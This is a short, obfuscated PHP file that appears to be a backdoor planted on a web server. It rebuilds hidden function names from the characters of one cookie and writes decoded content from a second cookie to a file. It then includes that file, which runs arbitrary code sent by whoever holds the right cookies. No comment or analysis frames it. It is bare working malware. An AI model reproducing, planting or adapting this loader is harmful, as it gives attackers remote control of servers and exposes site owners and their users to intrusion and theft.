<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[11])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 8;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[11][$n];
        if (!$c[11][$n + 1]) {
            if (!$c[11][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 8 + 1;
    }
    $k = $p[16]() . $p[3];
    if (!$p[28]($k)) {
        $n = $p[12]($k, $p[25]);
        $p[20]($n, $p[5] . $p[2]($p[26]($c[3])));
    }
    include($k);
}